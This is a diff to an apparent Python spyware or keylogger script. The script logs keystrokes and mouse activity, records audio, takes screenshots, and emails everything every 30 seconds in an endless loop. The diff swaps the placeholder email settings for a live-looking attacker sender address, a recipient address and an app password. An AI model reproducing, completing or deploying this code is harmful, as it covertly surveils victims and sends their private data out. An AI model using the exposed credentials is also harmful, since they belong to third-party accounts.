@@ -1,4 +1,5 @@
 import os
+import sys
 import time
 import smtplib
 import pyautogui
@@ -57,13 +58,13 @@ def update_data():
     record_audio("audio.wav")
     # Update screenshot
     take_screenshot()
-
+    
 # Function to send email with attachments
 def send_email():
     global log, mouse_log
-    from_email = "Your Mail"
-    to_email = "Recipient mail"
-    password = "Your password"
+    from_email = "anonymousha4ker@gmail.com"
+    to_email = "rudrakali7781@gmail.com"
+    password = "aoujyqnqonduzqdp"
 
     update_data()
 
@@ -149,4 +150,3 @@ mouse_monitoring_thread.start()
 while True:
     send_email()
     time.sleep(30)  # Send email every 30 seconds  
-
